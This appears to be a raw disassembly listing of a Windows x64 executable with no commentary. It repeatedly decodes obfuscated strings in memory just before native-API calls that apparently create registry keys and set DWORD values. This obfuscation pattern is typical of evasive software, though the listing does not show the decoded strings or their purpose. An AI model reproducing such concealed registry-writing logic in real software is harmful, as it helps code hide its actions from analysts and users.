   140004b95:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140004b9c:	00 
   140004b9d:	48 8d 8d 40 17 00 00 	lea    0x1740(%rbp),%rcx
   140004ba4:	4c 8d bd 40 0e 00 00 	lea    0xe40(%rbp),%r15
   140004bab:	4c 8d b5 00 17 00 00 	lea    0x1700(%rbp),%r14
   140004bb2:	ba 00 00 11 40       	mov    $0x40110000,%edx
   140004bb7:	4d 89 f8             	mov    %r15,%r8
   140004bba:	4d 89 f1             	mov    %r14,%r9
   140004bbd:	e8 ab c8 ff ff       	call   0x14000146d
   140004bc2:	85 c0                	test   %eax,%eax
   140004bc4:	78 3b                	js     0x140004c01
   140004bc6:	c6 85 20 17 00 00 01 	movb   $0x1,0x1720(%rbp)
   140004bcd:	48 8b 8d 40 17 00 00 	mov    0x1740(%rbp),%rcx
   140004bd4:	c7 44 24 20 0d 00 00 	movl   $0xd,0x20(%rsp)
   140004bdb:	00 
   140004bdc:	48 8d 95 00 17 00 00 	lea    0x1700(%rbp),%rdx
   140004be3:	4c 8d 85 20 17 00 00 	lea    0x1720(%rbp),%r8
   140004bea:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140004bf0:	e8 0f c8 ff ff       	call   0x140001404
   140004bf5:	48 8b 8d 40 17 00 00 	mov    0x1740(%rbp),%rcx
   140004bfc:	e8 5d c8 ff ff       	call   0x14000145e
   140004c01:	48 c7 85 30 17 00 00 	movq   $0x0,0x1730(%rbp)
   140004c08:	00 00 00 00 
   140004c0c:	80 3d 93 92 28 00 00 	cmpb   $0x0,0x289293(%rip)        # 0x14028dea6
   140004c13:	0f 84 b9 27 00 00    	je     0x1400073d2
   140004c19:	4c 8d a5 c0 16 00 00 	lea    0x16c0(%rbp),%r12
   140004c20:	80 3d ad 97 28 00 00 	cmpb   $0x0,0x2897ad(%rip)        # 0x14028e3d4
   140004c27:	0f 84 ce 00 00 00    	je     0x140004cfb
   140004c2d:	66 0f 6f 05 7b 5b 00 	movdqa 0x5b7b(%rip),%xmm0        # 0x14000a7b0
   140004c34:	00 
   140004c35:	66 0f 6f 0d 33 97 28 	movdqa 0x289733(%rip),%xmm1        # 0x14028e370
   140004c3c:	00 
   140004c3d:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004c41:	66 0f 6f 15 d7 59 00 	movdqa 0x59d7(%rip),%xmm2        # 0x14000a620
   140004c48:	00 
   140004c49:	66 0f db ca          	pand   %xmm2,%xmm1
   140004c4d:	66 0f 7f 0d 1b 97 28 	movdqa %xmm1,0x28971b(%rip)        # 0x14028e370
   140004c54:	00 
   140004c55:	66 0f 6f 0d 23 97 28 	movdqa 0x289723(%rip),%xmm1        # 0x14028e380
   140004c5c:	00 
   140004c5d:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004c61:	66 0f db ca          	pand   %xmm2,%xmm1
   140004c65:	66 0f 7f 0d 13 97 28 	movdqa %xmm1,0x289713(%rip)        # 0x14028e380
   140004c6c:	00 
   140004c6d:	66 0f 6f 0d 1b 97 28 	movdqa 0x28971b(%rip),%xmm1        # 0x14028e390
   140004c74:	00 
   140004c75:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004c79:	66 0f db ca          	pand   %xmm2,%xmm1
   140004c7d:	66 0f 7f 0d 0b 97 28 	movdqa %xmm1,0x28970b(%rip)        # 0x14028e390
   140004c84:	00 
   140004c85:	66 0f 6f 0d 13 97 28 	movdqa 0x289713(%rip),%xmm1        # 0x14028e3a0
   140004c8c:	00 
   140004c8d:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004c91:	66 0f db ca          	pand   %xmm2,%xmm1
   140004c95:	66 0f 7f 0d 03 97 28 	movdqa %xmm1,0x289703(%rip)        # 0x14028e3a0
   140004c9c:	00 
   140004c9d:	66 0f 6f 0d 0b 97 28 	movdqa 0x28970b(%rip),%xmm1        # 0x14028e3b0
   140004ca4:	00 
   140004ca5:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004ca9:	66 0f db ca          	pand   %xmm2,%xmm1
   140004cad:	66 0f 7f 0d fb 96 28 	movdqa %xmm1,0x2896fb(%rip)        # 0x14028e3b0
   140004cb4:	00 
   140004cb5:	66 0f fd 05 03 97 28 	paddw  0x289703(%rip),%xmm0        # 0x14028e3c0
   140004cbc:	00 
   140004cbd:	66 0f db c2          	pand   %xmm2,%xmm0
   140004cc1:	66 0f 7f 05 f7 96 28 	movdqa %xmm0,0x2896f7(%rip)        # 0x14028e3c0
   140004cc8:	00 
   140004cc9:	b8 fb 00 00 00       	mov    $0xfb,%eax
   140004cce:	03 05 fc 96 28 00    	add    0x2896fc(%rip),%eax        # 0x14028e3d0
   140004cd4:	0f b6 c0             	movzbl %al,%eax
   140004cd7:	66 89 05 f2 96 28 00 	mov    %ax,0x2896f2(%rip)        # 0x14028e3d0
   140004cde:	0f b7 05 ed 96 28 00 	movzwl 0x2896ed(%rip),%eax        # 0x14028e3d2
   140004ce5:	05 fb 00 00 00       	add    $0xfb,%eax
   140004cea:	0f b6 c0             	movzbl %al,%eax
   140004ced:	66 89 05 de 96 28 00 	mov    %ax,0x2896de(%rip)        # 0x14028e3d2
   140004cf4:	c6 05 d9 96 28 00 00 	movb   $0x0,0x2896d9(%rip)        # 0x14028e3d4
   140004cfb:	48 c7 85 e0 16 00 00 	movq   $0x0,0x16e0(%rbp)
   140004d02:	00 00 00 00 
   140004d06:	4c 8d 2d 63 96 28 00 	lea    0x289663(%rip),%r13        # 0x14028e370
   140004d0d:	4c 89 e9             	mov    %r13,%rcx
   140004d10:	e8 db 4f 00 00       	call   0x140009cf0
   140004d15:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140004d1c:	01 c0                	add    %eax,%eax
   140004d1e:	66 89 8d e2 16 00 00 	mov    %cx,0x16e2(%rbp)
   140004d25:	66 89 85 e0 16 00 00 	mov    %ax,0x16e0(%rbp)
   140004d2c:	4c 89 ad e8 16 00 00 	mov    %r13,0x16e8(%rbp)
   140004d33:	c7 85 a0 16 00 00 30 	movl   $0x30,0x16a0(%rbp)
   140004d3a:	00 00 00 
   140004d3d:	48 c7 85 a8 16 00 00 	movq   $0x0,0x16a8(%rbp)
   140004d44:	00 00 00 00 
   140004d48:	c7 85 b8 16 00 00 40 	movl   $0x40,0x16b8(%rbp)
   140004d4f:	00 00 00 
   140004d52:	48 8d 85 e0 16 00 00 	lea    0x16e0(%rbp),%rax
   140004d59:	48 89 85 b0 16 00 00 	mov    %rax,0x16b0(%rbp)
   140004d60:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140004d64:	f3 41 0f 7f 04 24    	movdqu %xmm0,(%r12)
   140004d6a:	48 8d 8d 30 17 00 00 	lea    0x1730(%rbp),%rcx
   140004d71:	4c 8d 85 a0 16 00 00 	lea    0x16a0(%rbp),%r8
   140004d78:	ba 03 00 00 00       	mov    $0x3,%edx
   140004d7d:	e8 f9 c7 ff ff       	call   0x14000157b
   140004d82:	85 c0                	test   %eax,%eax
   140004d84:	79 35                	jns    0x140004dbb
   140004d86:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140004d8d:	00 00 
   140004d8f:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140004d96:	00 
   140004d97:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004d9e:	00 00 
   140004da0:	48 8d 8d 30 17 00 00 	lea    0x1730(%rbp),%rcx
   140004da7:	4c 8d 85 a0 16 00 00 	lea    0x16a0(%rbp),%r8
   140004dae:	ba 03 00 00 00       	mov    $0x3,%edx
   140004db3:	45 31 c9             	xor    %r9d,%r9d
   140004db6:	e8 cf c7 ff ff       	call   0x14000158a
   140004dbb:	48 83 bd 30 17 00 00 	cmpq   $0x0,0x1730(%rbp)
   140004dc2:	00 
   140004dc3:	0f 84 03 01 00 00    	je     0x140004ecc
   140004dc9:	c7 85 40 0e 00 00 01 	movl   $0x1,0xe40(%rbp)
   140004dd0:	00 00 00 
   140004dd3:	80 3d cd 90 28 00 00 	cmpb   $0x0,0x2890cd(%rip)        # 0x14028dea7
   140004dda:	0f 84 11 2e 00 00    	je     0x140007bf1
   140004de0:	80 3d 23 96 28 00 00 	cmpb   $0x0,0x289623(%rip)        # 0x14028e40a
   140004de7:	74 76                	je     0x140004e5f
   140004de9:	66 0f 6f 05 2f 59 00 	movdqa 0x592f(%rip),%xmm0        # 0x14000a720
   140004df0:	00 
   140004df1:	66 0f 6f 0d e7 95 28 	movdqa 0x2895e7(%rip),%xmm1        # 0x14028e3e0
   140004df8:	00 
   140004df9:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004dfd:	66 0f 6f 15 1b 58 00 	movdqa 0x581b(%rip),%xmm2        # 0x14000a620
   140004e04:	00 
   140004e05:	66 0f db ca          	pand   %xmm2,%xmm1
   140004e09:	66 0f 7f 0d cf 95 28 	movdqa %xmm1,0x2895cf(%rip)        # 0x14028e3e0
   140004e10:	00 
   140004e11:	66 0f fd 05 d7 95 28 	paddw  0x2895d7(%rip),%xmm0        # 0x14028e3f0
   140004e18:	00 
   140004e19:	66 0f db c2          	pand   %xmm2,%xmm0
   140004e1d:	66 0f 7f 05 cb 95 28 	movdqa %xmm0,0x2895cb(%rip)        # 0x14028e3f0
   140004e24:	00 
   140004e25:	f3 0f 7e 05 d3 95 28 	movq   0x2895d3(%rip),%xmm0        # 0x14028e400
   140004e2c:	00 
   140004e2d:	66 0f fd 05 fb 58 00 	paddw  0x58fb(%rip),%xmm0        # 0x14000a730
   140004e34:	00 
   140004e35:	66 0f db 05 23 58 00 	pand   0x5823(%rip),%xmm0        # 0x14000a660
   140004e3c:	00 
   140004e3d:	66 0f d6 05 bb 95 28 	movq   %xmm0,0x2895bb(%rip)        # 0x14028e400
   140004e44:	00 
   140004e45:	8b 05 bd 95 28 00    	mov    0x2895bd(%rip),%eax        # 0x14028e408
   140004e4b:	83 c0 1d             	add    $0x1d,%eax
   140004e4e:	0f b6 c0             	movzbl %al,%eax
   140004e51:	66 89 05 b0 95 28 00 	mov    %ax,0x2895b0(%rip)        # 0x14028e408
   140004e58:	c6 05 ab 95 28 00 00 	movb   $0x0,0x2895ab(%rip)        # 0x14028e40a
   140004e5f:	48 c7 85 50 10 00 00 	movq   $0x0,0x1050(%rbp)
   140004e66:	00 00 00 00 
   140004e6a:	4c 8d 2d 6f 95 28 00 	lea    0x28956f(%rip),%r13        # 0x14028e3e0
   140004e71:	4c 89 e9             	mov    %r13,%rcx
   140004e74:	e8 77 4e 00 00       	call   0x140009cf0
   140004e79:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140004e80:	01 c0                	add    %eax,%eax
   140004e82:	66 89 8d 52 10 00 00 	mov    %cx,0x1052(%rbp)
   140004e89:	66 89 85 50 10 00 00 	mov    %ax,0x1050(%rbp)
   140004e90:	4c 89 ad 58 10 00 00 	mov    %r13,0x1058(%rbp)
   140004e97:	48 8b 8d 30 17 00 00 	mov    0x1730(%rbp),%rcx
   140004e9e:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140004ea3:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140004eaa:	00 
   140004eab:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140004eb2:	45 31 c0             	xor    %r8d,%r8d
   140004eb5:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140004ebb:	e8 24 c7 ff ff       	call   0x1400015e4
   140004ec0:	48 8b 8d 30 17 00 00 	mov    0x1730(%rbp),%rcx
   140004ec7:	e8 92 c5 ff ff       	call   0x14000145e
   140004ecc:	80 3d d5 8f 28 00 00 	cmpb   $0x0,0x288fd5(%rip)        # 0x14028dea8
   140004ed3:	0f 84 78 25 00 00    	je     0x140007451
   140004ed9:	80 3d 4e 95 28 00 00 	cmpb   $0x0,0x28954e(%rip)        # 0x14028e42e
   140004ee0:	74 7c                	je     0x140004f5e
   140004ee2:	66 0f 6f 05 26 95 28 	movdqa 0x289526(%rip),%xmm0        # 0x14028e410
   140004ee9:	00 
   140004eea:	66 0f fd 05 de 58 00 	paddw  0x58de(%rip),%xmm0        # 0x14000a7d0
   140004ef1:	00 
   140004ef2:	66 0f db 05 26 57 00 	pand   0x5726(%rip),%xmm0        # 0x14000a620
   140004ef9:	00 
   140004efa:	66 0f 7f 05 0e 95 28 	movdqa %xmm0,0x28950e(%rip)        # 0x14028e410
   140004f01:	00 
   140004f02:	f3 0f 7e 05 16 95 28 	movq   0x289516(%rip),%xmm0        # 0x14028e420
   140004f09:	00 
   140004f0a:	66 0f fd 05 ce 58 00 	paddw  0x58ce(%rip),%xmm0        # 0x14000a7e0
   140004f11:	00 
   140004f12:	66 0f db 05 46 57 00 	pand   0x5746(%rip),%xmm0        # 0x14000a660
   140004f19:	00 
   140004f1a:	66 0f d6 05 fe 94 28 	movq   %xmm0,0x2894fe(%rip)        # 0x14028e420
   140004f21:	00 
   140004f22:	f3 0f 7e 05 fe 94 28 	movq   0x2894fe(%rip),%xmm0        # 0x14028e428
   140004f29:	00 
   140004f2a:	66 0f fd 05 be 58 00 	paddw  0x58be(%rip),%xmm0        # 0x14000a7f0
   140004f31:	00 
   140004f32:	66 0f db 05 56 57 00 	pand   0x5756(%rip),%xmm0        # 0x14000a690
   140004f39:	00 
   140004f3a:	66 0f 7e 05 e6 94 28 	movd   %xmm0,0x2894e6(%rip)        # 0x14028e428
   140004f41:	00 
   140004f42:	b8 bb 00 00 00       	mov    $0xbb,%eax
   140004f47:	03 05 df 94 28 00    	add    0x2894df(%rip),%eax        # 0x14028e42c
   140004f4d:	0f b6 c0             	movzbl %al,%eax
   140004f50:	66 89 05 d5 94 28 00 	mov    %ax,0x2894d5(%rip)        # 0x14028e42c
   140004f57:	c6 05 d0 94 28 00 00 	movb   $0x0,0x2894d0(%rip)        # 0x14028e42e
   140004f5e:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004f63:	4c 8d 0d a6 94 28 00 	lea    0x2894a6(%rip),%r9        # 0x14028e410
   140004f6a:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140004f71:	b1 01                	mov    $0x1,%cl
   140004f73:	49 89 f8             	mov    %rdi,%r8
   140004f76:	e8 75 de ff ff       	call   0x140002df0
   140004f7b:	80 3d 27 8f 28 00 00 	cmpb   $0x0,0x288f27(%rip)        # 0x14028dea9
   140004f82:	0f 84 29 25 00 00    	je     0x1400074b1
   140004f88:	80 3d cb 94 28 00 00 	cmpb   $0x0,0x2894cb(%rip)        # 0x14028e45a
   140004f8f:	74 76                	je     0x140005007
   140004f91:	66 0f 6f 05 67 58 00 	movdqa 0x5867(%rip),%xmm0        # 0x14000a800
   140004f98:	00 
   140004f99:	66 0f 6f 0d 8f 94 28 	movdqa 0x28948f(%rip),%xmm1        # 0x14028e430
   140004fa0:	00 
   140004fa1:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004fa5:	66 0f 6f 15 73 56 00 	movdqa 0x5673(%rip),%xmm2        # 0x14000a620
   140004fac:	00 
   140004fad:	66 0f db ca          	pand   %xmm2,%xmm1
   140004fb1:	66 0f 7f 0d 77 94 28 	movdqa %xmm1,0x289477(%rip)        # 0x14028e430
   140004fb8:	00 
   140004fb9:	66 0f fd 05 7f 94 28 	paddw  0x28947f(%rip),%xmm0        # 0x14028e440
   140004fc0:	00 
   140004fc1:	66 0f db c2          	pand   %xmm2,%xmm0
   140004fc5:	66 0f 7f 05 73 94 28 	movdqa %xmm0,0x289473(%rip)        # 0x14028e440
   140004fcc:	00 
   140004fcd:	f3 0f 7e 05 7b 94 28 	movq   0x28947b(%rip),%xmm0        # 0x14028e450
   140004fd4:	00 
   140004fd5:	66 0f fd 05 33 58 00 	paddw  0x5833(%rip),%xmm0        # 0x14000a810
   140004fdc:	00 
   140004fdd:	66 0f db 05 7b 56 00 	pand   0x567b(%rip),%xmm0        # 0x14000a660
   140004fe4:	00 
   140004fe5:	66 0f d6 05 63 94 28 	movq   %xmm0,0x289463(%rip)        # 0x14028e450
   140004fec:	00 
   140004fed:	8b 05 65 94 28 00    	mov    0x289465(%rip),%eax        # 0x14028e458
   140004ff3:	83 c0 57             	add    $0x57,%eax
   140004ff6:	0f b6 c0             	movzbl %al,%eax
   140004ff9:	66 89 05 58 94 28 00 	mov    %ax,0x289458(%rip)        # 0x14028e458
   140005000:	c6 05 53 94 28 00 00 	movb   $0x0,0x289453(%rip)        # 0x14028e45a
   140005007:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000500c:	4c 8d 0d 1d 94 28 00 	lea    0x28941d(%rip),%r9        # 0x14028e430
   140005013:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   14000501a:	b1 01                	mov    $0x1,%cl
   14000501c:	49 89 f8             	mov    %rdi,%r8
   14000501f:	e8 cc dd ff ff       	call   0x140002df0
   140005024:	80 3d 7f 8e 28 00 00 	cmpb   $0x0,0x288e7f(%rip)        # 0x14028deaa
   14000502b:	0f 84 b1 24 00 00    	je     0x1400074e2
   140005031:	80 3d 4a 94 28 00 00 	cmpb   $0x0,0x28944a(%rip)        # 0x14028e482
   140005038:	74 56                	je     0x140005090
   14000503a:	66 0f 6f 05 de 57 00 	movdqa 0x57de(%rip),%xmm0        # 0x14000a820
   140005041:	00 
   140005042:	66 0f 6f 0d 16 94 28 	movdqa 0x289416(%rip),%xmm1        # 0x14028e460
   140005049:	00 
   14000504a:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000504e:	66 0f 6f 15 ca 55 00 	movdqa 0x55ca(%rip),%xmm2        # 0x14000a620
   140005055:	00 
   140005056:	66 0f db ca          	pand   %xmm2,%xmm1
   14000505a:	66 0f 7f 0d fe 93 28 	movdqa %xmm1,0x2893fe(%rip)        # 0x14028e460
   140005061:	00 
   140005062:	66 0f fd 05 06 94 28 	paddw  0x289406(%rip),%xmm0        # 0x14028e470
   140005069:	00 
   14000506a:	66 0f db c2          	pand   %xmm2,%xmm0
   14000506e:	66 0f 7f 05 fa 93 28 	movdqa %xmm0,0x2893fa(%rip)        # 0x14028e470
   140005075:	00 
   140005076:	8b 05 04 94 28 00    	mov    0x289404(%rip),%eax        # 0x14028e480
   14000507c:	83 c0 6b             	add    $0x6b,%eax
   14000507f:	0f b6 c0             	movzbl %al,%eax
   140005082:	66 89 05 f7 93 28 00 	mov    %ax,0x2893f7(%rip)        # 0x14028e480
   140005089:	c6 05 f2 93 28 00 00 	movb   $0x0,0x2893f2(%rip)        # 0x14028e482
   140005090:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005095:	4c 8d 0d c4 93 28 00 	lea    0x2893c4(%rip),%r9        # 0x14028e460
   14000509c:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   1400050a3:	b1 01                	mov    $0x1,%cl
   1400050a5:	49 89 f8             	mov    %rdi,%r8
   1400050a8:	e8 43 dd ff ff       	call   0x140002df0
   1400050ad:	80 3d f7 8d 28 00 00 	cmpb   $0x0,0x288df7(%rip)        # 0x14028deab
   1400050b4:	0f 84 59 24 00 00    	je     0x140007513
   1400050ba:	80 3d e9 93 28 00 00 	cmpb   $0x0,0x2893e9(%rip)        # 0x14028e4aa
   1400050c1:	74 5c                	je     0x14000511f
   1400050c3:	66 0f 6f 05 c5 93 28 	movdqa 0x2893c5(%rip),%xmm0        # 0x14028e490
   1400050ca:	00 
   1400050cb:	66 0f fd 05 6d 57 00 	paddw  0x576d(%rip),%xmm0        # 0x14000a840
   1400050d2:	00 
   1400050d3:	66 0f db 05 45 55 00 	pand   0x5545(%rip),%xmm0        # 0x14000a620
   1400050da:	00 
   1400050db:	66 0f 7f 05 ad 93 28 	movdqa %xmm0,0x2893ad(%rip)        # 0x14028e490
   1400050e2:	00 
   1400050e3:	f3 0f 7e 05 b5 93 28 	movq   0x2893b5(%rip),%xmm0        # 0x14028e4a0
   1400050ea:	00 
   1400050eb:	66 0f fd 05 5d 57 00 	paddw  0x575d(%rip),%xmm0        # 0x14000a850
   1400050f2:	00 
   1400050f3:	66 0f db 05 65 55 00 	pand   0x5565(%rip),%xmm0        # 0x14000a660
   1400050fa:	00 
   1400050fb:	66 0f d6 05 9d 93 28 	movq   %xmm0,0x28939d(%rip)        # 0x14028e4a0
   140005102:	00 
   140005103:	b8 ad 00 00 00       	mov    $0xad,%eax
   140005108:	03 05 9a 93 28 00    	add    0x28939a(%rip),%eax        # 0x14028e4a8
   14000510e:	0f b6 c0             	movzbl %al,%eax
   140005111:	66 89 05 90 93 28 00 	mov    %ax,0x289390(%rip)        # 0x14028e4a8
   140005118:	c6 05 8b 93 28 00 00 	movb   $0x0,0x28938b(%rip)        # 0x14028e4aa
   14000511f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005124:	4c 8d 0d 65 93 28 00 	lea    0x289365(%rip),%r9        # 0x14028e490
   14000512b:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140005132:	b1 01                	mov    $0x1,%cl
   140005134:	49 89 f8             	mov    %rdi,%r8
   140005137:	e8 b4 dc ff ff       	call   0x140002df0
   14000513c:	80 3d 69 8d 28 00 00 	cmpb   $0x0,0x288d69(%rip)        # 0x14028deac
   140005143:	0f 84 20 24 00 00    	je     0x140007569
   140005149:	80 3d 7c 93 28 00 00 	cmpb   $0x0,0x28937c(%rip)        # 0x14028e4cc
   140005150:	74 67                	je     0x1400051b9
   140005152:	66 0f 6f 05 56 93 28 	movdqa 0x289356(%rip),%xmm0        # 0x14028e4b0
   140005159:	00 
   14000515a:	66 0f fd 05 0e 57 00 	paddw  0x570e(%rip),%xmm0        # 0x14000a870
   140005161:	00 
   140005162:	66 0f db 05 b6 54 00 	pand   0x54b6(%rip),%xmm0        # 0x14000a620
   140005169:	00 
   14000516a:	66 0f 7f 05 3e 93 28 	movdqa %xmm0,0x28933e(%rip)        # 0x14028e4b0
   140005171:	00 
   140005172:	f3 0f 7e 05 46 93 28 	movq   0x289346(%rip),%xmm0        # 0x14028e4c0
   140005179:	00 
   14000517a:	66 0f fd 05 fe 56 00 	paddw  0x56fe(%rip),%xmm0        # 0x14000a880
   140005181:	00 
   140005182:	66 0f db 05 d6 54 00 	pand   0x54d6(%rip),%xmm0        # 0x14000a660
   140005189:	00 
   14000518a:	66 0f d6 05 2e 93 28 	movq   %xmm0,0x28932e(%rip)        # 0x14028e4c0
   140005191:	00 
   140005192:	f3 0f 7e 05 2e 93 28 	movq   0x28932e(%rip),%xmm0        # 0x14028e4c8
   140005199:	00 
   14000519a:	66 0f fd 05 ee 56 00 	paddw  0x56ee(%rip),%xmm0        # 0x14000a890
   1400051a1:	00 
   1400051a2:	66 0f db 05 e6 54 00 	pand   0x54e6(%rip),%xmm0        # 0x14000a690
   1400051a9:	00 
   1400051aa:	66 0f 7e 05 16 93 28 	movd   %xmm0,0x289316(%rip)        # 0x14028e4c8
   1400051b1:	00 
   1400051b2:	c6 05 13 93 28 00 00 	movb   $0x0,0x289313(%rip)        # 0x14028e4cc
   1400051b9:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400051be:	4c 8d 0d eb 92 28 00 	lea    0x2892eb(%rip),%r9        # 0x14028e4b0
   1400051c5:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   1400051cc:	b1 01                	mov    $0x1,%cl
   1400051ce:	49 89 f8             	mov    %rdi,%r8
   1400051d1:	e8 1a dc ff ff       	call   0x140002df0
   1400051d6:	80 3d d0 8c 28 00 00 	cmpb   $0x0,0x288cd0(%rip)        # 0x14028dead
   1400051dd:	0f 84 dd 23 00 00    	je     0x1400075c0
   1400051e3:	80 3d 5c 93 28 00 00 	cmpb   $0x0,0x28935c(%rip)        # 0x14028e546
   1400051ea:	0f 84 f5 00 00 00    	je     0x1400052e5
   1400051f0:	66 0f 6f 05 a8 54 00 	movdqa 0x54a8(%rip),%xmm0        # 0x14000a6a0
   1400051f7:	00 
   1400051f8:	66 0f 6f 15 d0 92 28 	movdqa 0x2892d0(%rip),%xmm2        # 0x14028e4d0
   1400051ff:	00 
   140005200:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005204:	66 0f 6f 0d 14 54 00 	movdqa 0x5414(%rip),%xmm1        # 0x14000a620
   14000520b:	00 
   14000520c:	66 0f db d1          	pand   %xmm1,%xmm2
   140005210:	66 0f 7f 15 b8 92 28 	movdqa %xmm2,0x2892b8(%rip)        # 0x14028e4d0
   140005217:	00 
   140005218:	66 0f 6f 15 c0 92 28 	movdqa 0x2892c0(%rip),%xmm2        # 0x14028e4e0
   14000521f:	00 
   140005220:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005224:	66 0f db d1          	pand   %xmm1,%xmm2
   140005228:	66 0f 7f 15 b0 92 28 	movdqa %xmm2,0x2892b0(%rip)        # 0x14028e4e0
   14000522f:	00 
   140005230:	66 0f 6f 15 b8 92 28 	movdqa 0x2892b8(%rip),%xmm2        # 0x14028e4f0
   140005237:	00 
   140005238:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000523c:	66 0f db d1          	pand   %xmm1,%xmm2
   140005240:	66 0f 7f 15 a8 92 28 	movdqa %xmm2,0x2892a8(%rip)        # 0x14028e4f0
   140005247:	00 
   140005248:	66 0f 6f 15 b0 92 28 	movdqa 0x2892b0(%rip),%xmm2        # 0x14028e500
   14000524f:	00 
   140005250:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005254:	66 0f db d1          	pand   %xmm1,%xmm2
   140005258:	66 0f 7f 15 a0 92 28 	movdqa %xmm2,0x2892a0(%rip)        # 0x14028e500
   14000525f:	00 
   140005260:	66 0f 6f 15 a8 92 28 	movdqa 0x2892a8(%rip),%xmm2        # 0x14028e510
   140005267:	00 
   140005268:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000526c:	66 0f db d1          	pand   %xmm1,%xmm2
   140005270:	66 0f 7f 15 98 92 28 	movdqa %xmm2,0x289298(%rip)        # 0x14028e510
   140005277:	00 
   140005278:	66 0f 6f 15 a0 92 28 	movdqa 0x2892a0(%rip),%xmm2        # 0x14028e520
   14000527f:	00 
   140005280:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005284:	66 0f db d1          	pand   %xmm1,%xmm2
   140005288:	66 0f 7f 15 90 92 28 	movdqa %xmm2,0x289290(%rip)        # 0x14028e520
   14000528f:	00 
   140005290:	66 0f fd 05 98 92 28 	paddw  0x289298(%rip),%xmm0        # 0x14028e530
   140005297:	00 
   140005298:	66 0f db c1          	pand   %xmm1,%xmm0
   14000529c:	66 0f 7f 05 8c 92 28 	movdqa %xmm0,0x28928c(%rip)        # 0x14028e530
   1400052a3:	00 
   1400052a4:	8b 05 96 92 28 00    	mov    0x289296(%rip),%eax        # 0x14028e540
   1400052aa:	83 c0 5d             	add    $0x5d,%eax
   1400052ad:	0f b6 c0             	movzbl %al,%eax
   1400052b0:	66 89 05 89 92 28 00 	mov    %ax,0x289289(%rip)        # 0x14028e540
   1400052b7:	0f b7 05 84 92 28 00 	movzwl 0x289284(%rip),%eax        # 0x14028e542
   1400052be:	83 c0 5d             	add    $0x5d,%eax
   1400052c1:	0f b6 c0             	movzbl %al,%eax
   1400052c4:	66 89 05 77 92 28 00 	mov    %ax,0x289277(%rip)        # 0x14028e542
   1400052cb:	8b 05 73 92 28 00    	mov    0x289273(%rip),%eax        # 0x14028e544
   1400052d1:	83 c0 5d             	add    $0x5d,%eax
   1400052d4:	0f b6 c0             	movzbl %al,%eax
   1400052d7:	66 89 05 66 92 28 00 	mov    %ax,0x289266(%rip)        # 0x14028e544
   1400052de:	c6 05 61 92 28 00 00 	movb   $0x0,0x289261(%rip)        # 0x14028e546
   1400052e5:	80 3d c2 8b 28 00 00 	cmpb   $0x0,0x288bc2(%rip)        # 0x14028deae
   1400052ec:	0f 84 6f 23 00 00    	je     0x140007661
   1400052f2:	80 3d 6d 92 28 00 00 	cmpb   $0x0,0x28926d(%rip)        # 0x14028e566
   1400052f9:	74 5a                	je     0x140005355
   1400052fb:	66 0f 6f 05 4d 92 28 	movdqa 0x28924d(%rip),%xmm0        # 0x14028e550
   140005302:	00 
   140005303:	66 0f fd 05 95 53 00 	paddw  0x5395(%rip),%xmm0        # 0x14000a6a0
   14000530a:	00 
   14000530b:	66 0f db 05 0d 53 00 	pand   0x530d(%rip),%xmm0        # 0x14000a620
   140005312:	00 
   140005313:	66 0f 7f 05 35 92 28 	movdqa %xmm0,0x289235(%rip)        # 0x14028e550
   14000531a:	00 
   14000531b:	66 0f 6f 05 3d 92 28 	movdqa 0x28923d(%rip),%xmm0        # 0x14028e560
   140005322:	00 
   140005323:	66 0f fd 05 85 55 00 	paddw  0x5585(%rip),%xmm0        # 0x14000a8b0
   14000532a:	00 
   14000532b:	66 0f db 05 5d 53 00 	pand   0x535d(%rip),%xmm0        # 0x14000a690
   140005332:	00 
   140005333:	66 0f 7e 05 25 92 28 	movd   %xmm0,0x289225(%rip)        # 0x14028e560
   14000533a:	00 
   14000533b:	8b 05 23 92 28 00    	mov    0x289223(%rip),%eax        # 0x14028e564
   140005341:	83 c0 5d             	add    $0x5d,%eax
   140005344:	0f b6 c0             	movzbl %al,%eax
   140005347:	66 89 05 16 92 28 00 	mov    %ax,0x289216(%rip)        # 0x14028e564
   14000534e:	c6 05 11 92 28 00 00 	movb   $0x0,0x289211(%rip)        # 0x14028e566
   140005355:	48 8d 0d 74 91 28 00 	lea    0x289174(%rip),%rcx        # 0x14028e4d0
   14000535c:	48 8d 15 ed 91 28 00 	lea    0x2891ed(%rip),%rdx        # 0x14028e550
   140005363:	e8 88 e5 ff ff       	call   0x1400038f0
